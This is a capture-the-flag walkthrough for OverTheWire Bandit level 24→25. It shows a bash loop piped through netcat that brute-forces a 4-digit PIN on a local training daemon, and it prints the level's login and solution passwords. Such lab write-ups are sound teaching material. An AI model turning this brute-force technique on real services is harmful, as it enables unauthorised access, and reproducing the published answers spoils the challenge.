# Bandit Level 24 → Level 25

| Key | Value |
|:---|:---|
| **Objective** | Brute-force a 4-digit PIN (0000–9999) on a network service listening at `localhost:30002` to retrieve the password for `bandit25`. |
| **Host** | `bandit.labs.overthewire.org` |
| **Port** | `2220` |
| **Username** | `bandit24` |
| **Password** | `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv` |
| **Key Commands** | `for i in {0000..9999}; do echo ...; done | nc localhost 30002 | grep -v "Wrong"` |

---

## 🎯 Challenge Description

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time.

---

## 🔬 Technical Analysis

### Automated Network Socket Brute-Forcing via Bash
1. **Daemon Protocol**:
   The service on `localhost:30002` expects lines in the format:
   `<bandit24_password> <4_digit_pin>`
   The daemon stays connected over a single TCP session, accepting continuous guesses.
2. **Bash Brace Expansion (`{0000..9999}`)**:
   Bash expands `{0000..9999}` into 10,000 zero-padded strings (`0000`, `0001`, ..., `9999`).
3. **Filtering Server Output**:
   Incorrect guesses return `Wrong! Please enter the correct pincode. Try again.`. Filtering output with `grep -v "Wrong"` discards 9,999 error lines and displays only the winning line.

---

## 🚀 Solution Walkthrough

### Step 1: Connect via SSH
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
# Password: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

### Step 2: Execute the Brute-Force Pipeline
```bash
for pin in {0000..9999}; do
    echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $pin"
done | nc localhost 30002 | grep -v "Wrong"
```
**Output:**
```text
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

---

## 🔑 Password Found

```text
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

---

## 💡 Key Takeaways

- Brace expansion `{0000..9999}` generates zero-padded numerical sequences instantly in Bash.
- Piping data into Netcat avoids per-attempt network handshake latency.
- `grep -v <pattern>` inverts matching to eliminate noise from brute-force responses.

---

[← Previous Level](level_23_to_24.md) | [📋 Summary](README.md) | [Next Level →](level_25_to_26.md)
